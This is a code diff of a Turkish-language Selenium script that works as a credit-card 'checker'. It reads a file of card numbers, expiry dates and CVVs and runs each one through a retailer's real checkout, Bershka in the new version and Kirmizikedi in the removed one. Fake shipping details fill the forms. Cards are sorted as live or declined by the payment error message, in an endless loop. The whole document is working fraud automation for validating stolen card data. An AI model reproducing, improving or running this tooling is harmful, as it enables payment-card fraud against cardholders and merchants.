@@ -1,106 +1,178 @@
+import os
+import random
+import string
+import sys
+from http import client
+from time import sleep
+from typing import BinaryIO, Text
+from colorama import Fore, Back, Style, init
+
+
 from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.firefox.options import Options
+from selenium.webdriver.support import expected_conditions
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.support import select
+from selenium.webdriver.support.select import Select
 from selenium.webdriver.support.ui import Select
-import time
+from selenium.webdriver.support.wait import WebDriverWait
 
 
-mail = input('Mail: ')
-passw = input('Password: ')
-Card = input('Card Number: ')
-Skt = input('Month (type without using 0. Ex:4):')
-Skt1 = input('Year (Ex:2024): ')
-Cvv = input('Cvv: ')
+def funct():
+    CCList = open(r'/home/kali/Masaüstü/Register User/cc.txt', "r", encoding="utf8").read().splitlines()
+    kartlar = []
 
-driver_path = "C:\\Users\\XXXX\\Desktop\\checker\\chromedriver.exe"
-options = Options()
-options.add_argument('--headless')
+    for i in CCList:
+        bolum = i.split('|')
+        kartlar.append((bolum[0], bolum[1], bolum[2], bolum[3]) ,)
+
+    return kartlar
+
+
+letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
+           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
+def random_char(char_num):
+       return ''.join(random.choice(string.ascii_letters) for _ in range(char_num))
+
+user_agent = "Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36"
+caps = webdriver.DesiredCapabilities.CHROME.copy() 
+caps['acceptInsecureCerts'] = True
+options = webdriver.ChromeOptions()
+options.add_experimental_option("excludeSwitches", ["enable-logging"])
+options.add_argument('--silent')
+options.add_argument('--lang=tr')
 options.add_argument('--disable-gpu')
-browser = webdriver.Chrome(executable_path=driver_path,chrome_options=options)
-browser.get('https://www.kirmizikedi.com/uyelik/uye-giris')
+options.add_argument('--ignore-certificate-errors')
+options.add_argument('--no-sandbox')
+#options.add_argument('--headless')
+driver = webdriver.Chrome(executable_path=r'/home/kali/Masaüstü/Register User/chromedriver', options=options)
+driver.set_window_size(360,640)
+#driver = webdriver.Firefox(profile, options=options)
+wait = WebDriverWait(driver, 25, poll_frequency=1)
+init(autoreset=True)
+while True:
 
-email = browser.find_element_by_id('EmailAddress')
-email.send_keys(mail)
-password = browser.find_element_by_id('Password')
-password.send_keys(passw)
-login = browser.find_element_by_xpath('/html/body/section[2]/div/div[1]/div/form/button')
-login.click()
-browser.get('https://www.kirmizikedi.com/kitap/urun/4b1aa737165344468b096a806b683d09')
-sepete_ekle = browser.find_element_by_id('sepeteekle_4b1aa737165344468b096a806b683d09')
-sepete_ekle.click()
-time.sleep(3)
-sepete_git = browser.find_element_by_id('cartLink')
-sepete_git.click()
-time.sleep(1)
-buy = browser.find_element_by_xpath('/html/body/section[2]/div/div[1]/div[2]/div[2]/div/div[2]/a')
-buy.click()
-time.sleep(2)
-""" yeni_adres = browser.find_element_by_xpath('/html/body/section[2]/div/div[1]/form/div[1]/a')
-yeni_adres.click()
-
-adres_adı = browser.find_element_by_name('Address.Name')
-adres_adı.send_keys('ev')
-
-alacak_kisi = browser.find_element_by_name('Address.DeliveryPerson')
-alacak_kisi.send_keys('metin sen')
-
-ülke = Select(browser.find_element_by_name('Address.CountryId'))
-ülke.select_by_value('1')
-time.sleep(1)
-sehir = Select(browser.find_element_by_name('Address.CityId'))
-sehir.select_by_value('4')
-time.sleep(1)
-ilce = Select(browser.find_element_by_name('Address.TownId'))
-ilce.select_by_value('52')
-
-posta_kodu = browser.find_element_by_id('Address_PostalCode')
-posta_kodu.send_keys('21100')
-
-acık_adres = browser.find_element_by_name('Address.StreetAddress')
-acık_adres.send_keys('asdasdasdasd56as1d56as1da')
-
-telefon = browser.find_element_by_name('Address.PhoneNumber')
-telefon.send_keys('5523694951')
-
-varsayılan = browser.find_element_by_xpath('/html/body/section[2]/div/div[1]/div/div[3]/form/div[11]/label/input')
-varsayılan.click()
-
-kaydet = browser.find_element_by_xpath('/html/body/section[2]/div/div[1]/div/div[3]/form/button')
-kaydet.click()"""
-
-devam_et = browser.find_element_by_xpath('/html/body/section[2]/div/div[1]/form/div[2]/div[2]/div/div[2]/button')
-devam_et.click()
-time.sleep(2)
-devam_et2 = browser.find_element_by_xpath('/html/body/section[2]/div/div[1]/form/div[2]/div[2]/div/div[2]/button')
-devam_et2.click()
-cardname = browser.find_element_by_name('CreditCard.KarttakiIsim')
-cardname.send_keys('Metin Şen')
-CardNumber = browser.find_element_by_name('CreditCard.KartNum')
-CardNumber.send_keys(Card)
-Skt_number = Select(browser.find_element_by_name('CreditCard.ExpireDateMonth'))
-Skt_number.select_by_visible_text(Skt)
-Skt_year = Select(browser.find_element_by_name('CreditCard.ExpireDateYear'))
-Skt_year.select_by_visible_text(Skt1)
-Cvv_number = browser.find_element_by_id('CreditCard_Gk')
-Cvv_number.send_keys(Cvv)
-for i in range(1,2):
-    browser.execute_script('window.scrollTo(0,document.body.scrollHeight)')
-    time.sleep(3)
-Ön_bilgilendirme = browser.find_element_by_xpath('/html/body/section[2]/div/div[1]/form/div[1]/div[5]/div/label/input')
-Ön_bilgilendirme.click()
-time.sleep(1)
-Mesafeli = browser.find_element_by_xpath('/html/body/section[2]/div/div[1]/form/div[1]/div[6]/div/label/input')
-Mesafeli.click()
-time.sleep(1)
-Sepeti_onayla = browser.find_element_by_id('btnCompleteOrder')
-Sepeti_onayla.click()
-time.sleep(5)
-try:
-    dec = browser.find_element_by_xpath('/html/body/section[2]/div/div[1]/form/div[1]/div[2]/div').text
-    print(dec)
-    print("Dec: "+Card+"|"+Skt+"|"+Skt1+"|"+Cvv)
-except:
-    a = ('Live: '+Card+"|"+Skt+"|"+Skt1+"|"+Cvv)
-    print(a)    
-
-   
+        print('Starting ..')
+        driver.delete_all_cookies()
+        driver.get("https://www.bershka.com/tr/3%E2%80%99l%C3%BC-desenli-%C3%A7orap-paketi.-c0p102944194.html?colorId=800")
+        sleep(2)
+        wait.until(EC.presence_of_element_located((By.ID, 'onetrust-accept-btn-handler'))).click()
+        wait.until(
+        EC.presence_of_element_located((By.CSS_SELECTOR, '.button-text'))).click()
+        #driver.find_element_by_css_selector('.button-text').click()
+        sleep(2)
+        driver.get("https://www.bershka.com/tr/checkout.html")
+        sleep(2)
+        wait.until(
+             EC.presence_of_element_located((By.XPATH, '//*[@id="shipping-wrapper"]/div[1]/shipping-methods/shipping-method[1]/div/span'))
+        ).click()
+        driver.find_element_by_css_selector('.ellipsis').click()
+        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#store-search'))).send_keys('a')
+        sleep(1)
+        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'button.inverse:nth-child(2)'))).click()
+        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'bsk-store-address.stores-address-container:nth-child(1) > div:nth-child(1)'))).click()
+        wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div"))).click()
+        wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div/input"))).send_keys("ahe3eds")
+        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").click()
+        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").send_keys("limkd3ert")
+        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[3]/div/input").click()
+        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[3]/div/input").send_keys("ka3532s39et@mail.com")
+        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").click()
+        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").send_keys("5344443565")
+        driver.find_element_by_xpath("//*[@id='summary-wrapper']/div/div[2]/div/div/cta-checkout/div/div/div[2]/div").click()
+        sleep(1)
+        driver.find_element_by_css_selector("#summary-wrapper > div > div.summary-cta > div > div > cta-checkout > div > div > div.cta-checkout-post > div > button").click()
+        value=input(" Kart Tipini Seçiniz :\nVisa    :    [1]  : \nMastercard : [2]  :")
+        if value =='1':
+            wait.until(EC.presence_of_element_located(((By.CSS_SELECTOR, '.payment-19-info > span:nth-child(1)')))).click()
+            print(f'Seçim [1]: Visa Seçildi ..') 
+            
+        elif value == ('2'):
+            wait.until(EC.presence_of_element_located(((By.CSS_SELECTOR, '.payment-20-info > span:nth-child(1)')))).click()
+            print(f'Seçim [2] Mastercard Seçildi ..')
+             
+        else: 
+           print('Yanlış Seçim Yaptınız..')
+           print('Yanlış Seçim Yaptınız..')
+           print('Yanlış Seçim Yaptınız..')
+           print('Yanlış Seçim Yaptınız..')
+           break
+           
+         
+        tikli = False
+        kartlar = funct()
+        for (cc, mm, yy, cvv) in kartlar:
+            wait.until(
+             EC.presence_of_element_located((By.XPATH, '/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/div[1]/form/div[1]/payment-credit-card/ng-form/ul/li[1]/div/input'))
+            ).clear()
+            wait.until(
+             EC.presence_of_element_located((By.XPATH, '/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/div[1]/form/div[1]/payment-credit-card/ng-form/ul/li[1]/div/input'))
+            ).send_keys(cc)
+            wait.until(
+             EC.presence_of_element_located((By.NAME, "month"))
+            ).click()
+            wait.until(
+             EC.presence_of_element_located((By.NAME, "month"))
+            ).send_keys(mm)          
+            wait.until(
+            EC.presence_of_element_located((By.NAME, "year"))
+            ).click  
+            wait.until(
+            EC.presence_of_element_located((By.NAME, "year"))
+            ).send_keys(yy)  
+            wait.until(
+            EC.presence_of_element_located((By.NAME, "cvv2"))
+            ).clear()
+            wait.until(
+            EC.presence_of_element_located((By.NAME, "cvv2"))
+            ).send_keys(cvv)
+            wait.until(
+            EC.presence_of_element_located((By.NAME, "holder"))
+            ).clear()
+            driver.find_element_by_name("holder").send_keys("alicae ase") 
+            try:
+                sleep(1)
+                dropdown = driver.find_element(By.NAME, "paymentModeId")
+            except:continue
+            dropdown = driver.find_element(By.NAME, "paymentModeId")
+            try:
+                dropdown.find_element(By.XPATH, "//option[. = 'Tek Çekim Ödeme']").click()
+            except: continue    
+            x=driver.find_element_by_name("number").is_displayed()
+            if tikli == False:
+               driver.find_element_by_name("privacyPolicy").click()
+            tikli = True
+            driver.find_element_by_css_selector(".ellipsis").click()
+            driver.execute_script("window.scrollTo(0,0)")
+            sleep(3)            
+                 #print(EC.presence_of_element_located(By.CSS_SELECTOR, '.checkout--error--2RoAR > .checkout--right-col--1y9nm > span')).text
+                 #print(EC.presence_of_element_located(By.CSS_SELECTOR, '.checkout--error--2RoAR > div:nth-child(2) > span:nth-child(1)')).text
+            hata2 = ('Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.')
+            hata1 = ('Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.')
+            hata3 = ('Transaction not completed. Enter the expiry date on your card')
+            try:
+                yazi = driver.find_element(By.CSS_SELECTOR, ".message").text
+                if yazi == hata1 :
+                    print(Fore.GREEN +yazi," :", cc,"|",mm,"|",yy,"|",cvv,)
+                elif yazi == hata2 :
+                    print(Fore.GREEN +yazi," :",cc,"|",mm,"|",yy,"|",cvv,)
+                elif yazi == hata3 :
+                    print(Fore.GREEN + yazi," :",cc,"|",mm,"|",yy,"|",cvv,)
+                else :
+                    print(Fore.RED + '!!! -HATA OLDU AQ- !!! : ',cc,"|",mm,"|",yy,"|",cvv,)     
+             #driver.find_element_by_xpath("//p[contains(.,'Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.')]" or "//p[contains(.,'Transaction not completed. Enter the expiry date on your card')]")
+             #print('--İşlem reddedildi-- : ',cc,"|",mm,"|",yy,"|",cvv,)
+                driver.find_element_by_css_selector(".ui-button").click()
+             #('Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.'):
+                 #print('!!! -HATA OLDU- !!! : ',cc,"|",mm,"|",yy,"|",cvv,) 
+            except:
+                print(Fore.RED + '!!! -HATA OLDU- !!! : ',cc,"|",mm,"|",yy,"|",cvv,)
+                driver.refresh()
+                driver.refresh()
+                tikli = False
+                sleep(1)
+                continue
